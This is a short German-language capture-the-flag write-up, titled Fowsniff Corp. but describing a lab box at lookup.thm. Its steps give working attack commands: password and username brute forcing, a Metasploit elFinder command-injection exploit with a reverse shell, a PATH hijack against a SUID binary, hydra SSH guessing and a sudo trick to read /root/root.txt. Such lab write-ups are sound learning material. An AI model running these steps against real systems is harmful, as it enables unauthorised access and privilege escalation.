# CTF Writeup: Fowsniff Corp.

---

1. Step: nmap scan gemacht  
2. Step: ip/domain in meinen /etc/hosts getan um DNS zu umgehen  
3. Step: mit burpsuite proxy request und response abgefangen um daten zu gainen  
4. step: fuff gerunned und password herausgefunden "password123" -> username fehlt noch  
5. step: fuff nochmal gerunned mit "seclist" 10 million names --> username = jose  
6. step: wir wurden weitergeleitet an eine neue subdomain namens "files.lookup.thm" und haben diese in /etc/hosts geadded um den DNS zu umgehen  
7. step: auf der sub-domain ist mir klar geworden das die seite ihre daten auf einem webserver verwaltet mit "elfinder"
dieser ist sehr outdated und ich möchte diesen auf exploits überprüfen mit metasploitable.
-> metasploitable in cmd aufgerufen "msf6 > search elfinder"  
8. step: exploit 4 ausgewählt "Command Injection" -> PHP Connector exiftran Command Injection  
9. step: rhost -> target (files.lookup.thm) ausgewählt mit dem wir unsere shell remote connecten werden  
10. step: lhost -> intruder (wir) -> ip ausgewählt  
11. step: in meterpreter > shell initiiert  
12. step: python3 -c 'import pty; pty.spawn("/bin/bash")' um eine interaktive shell zu erstellen  
13. step: "find / -type f -name user.txt 2>/dev/null" sucht nach user.txt im gesamten Dateisystem und blendet
dabei Fehlermeldung aus.  
14. step: /home/think/user.txt gefunden aber permission denied als ich sie displayen/ausführen wollte.  
15. step: "find / -perm /4000 2>/dev/null" suche nach Dateien die perms haben und blende Fehlermeldung aus.  
16. step: alle Verzeichnisse ausgeführt -> /usr/sbin/pwm ist interessant und daraufhin Berechtigungen überprüft
ls -la /usr/sbin/pwm  
17. step: temporäres Verzeichnis zum PATH geadded "export PATH=/tmp:$PATH"  
18. step: bash Skript Ausführung in /tmp/id hinzugefügt. "echo '#!/bin/bash' > /tmp/id  
19. step: ein paar uids und groups zu dem user "think" hinzufügen im Skript /tmp/id -> "echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id   
20. step: executions rights für /tmp/id erstellt mit "chmod +x /tmp/id" und jetzt kann man den pfad /usr/sbin/pwm aufrufen  
21.step: wordlist erstellt pass.txt und die daten von /usr/sbin/pwm da eingefügt für hydra running  
22. step: sehr viele potentielle pw's bekommen und hydra gerunned mit command "hydra -l think -P pass.txt -t 4 - VV lookup.th ssh" und dadurch den -> hostname, username & pw ermittelt.  
23. step: in die ssh eingeloggt mit "ssh think@lookup.thm und mit pw eingeloggt.  
24. step: ls gemacht und "user.txt" gefunden -> user flag gefunden  
25. step: sudo -l gemacht um zu verstehen welche commands möglich sind  
26. step: LFILE=/root/root.txt variabelzuweisung gemacht  
27. step: "sudo look '' "$LFILE" dieser command sucht im Endeffekt nach allen Zeile die, die LFILE (root.txt) enthält. -> root flag ermittelt.  

---

## Key Learnings

### - Learned how to execute DNS Bypasses
### - First Contact with Burp Suite and Packet Manipulation & Packet Analysis
### - First Contact with fuzz & passwort brute forcing
### - SecList installiert
### - Learned more about Metasploitable
### - Learned more about reverse shells and generated reverse shell bash script
### - Learned a lot about privilege escalations & ssh's
